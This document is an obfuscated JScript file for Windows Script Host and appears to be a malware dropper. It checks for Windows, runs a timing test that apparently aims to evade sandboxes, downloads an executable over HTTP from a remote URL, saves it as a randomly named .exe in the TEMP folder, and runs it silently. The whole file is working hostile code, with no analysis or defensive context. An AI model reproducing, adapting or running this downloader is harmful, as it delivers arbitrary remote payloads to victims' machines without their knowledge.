var h = false;
var F = "CreateObject";
var c = function lg() {return WScript[F]("WScript.Shell");}(), UQ = 11;
var A = "MSXML2.XMLHTTP";
var n = 2123213;
var dL = 0;
function i(GS){c["Run"](GS, dL, dL);};
function W(){return "" + A;};
function H(s, X){dL = dL * 1; return s - X;};
function Q(){return F;};
/*@cc_on
  @if (@_win32 || @_win64)
    h = true;
  @end
@*/
if (h)
{
var Am = "";
function I(){return 22;};
var lj = 0; var SP = 0;
function cF()
{
var q = new this["Date"]();
var H0 = q["getUTCMilliseconds"]();
WScript["Sleep"](I());
var q = new this["Date"]();
var T = q["getUTCMilliseconds"]();
WScript["Sleep"](I());
var q = new this["Date"]();
var jo = q["getUTCMilliseconds"]();
var lj = "y";
lj = H(T, H0);
var SP = "r";
SP = H(jo, T);
Am = "open";
return H(lj, SP);
}
var R = false;
var oD = false;
for (var jn = dL; jn < I() * 1; jn++){if (cF() != dL){
R = true; 
SP = "31" + 11 * lj + SP; 
oD = true; 
break;
}}
function gY() {return ((R == true) && (R == oD)) ? 1 : dL;};
if (R && gY() && oD){
function NE() {return c["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "RVwLBpNK4V8XHWL.exe";};
 B = W();
 xS = WScript[F](B);
 var J = 1;
 while (J){
try {
xS[Am]("GET", "http://blog.saletron.net/li9soz", false);
xS["send"]();
p = "Sleep";
for (;;){WScript[p](I() * 11); if (xS["readystate"] >= 2 * 2) break;};
J = dL;
} catch(p0){};
}
function uz(OM) {var Ib = (1, 2, 3, 4, 5, OM); return Ib;};
rf = WScript[Q()]("ADODB.Stream");
B = rf;
B[Am]();
B["type"] = uz(1);
B["write"](xS["ResponseBody"]);
rf["position"] = uz(dL);
B["Save" + "ToFile"](NE(), 2);
rf["c"+"lose"]();
Ap = NE();
i(Ap);
}
}

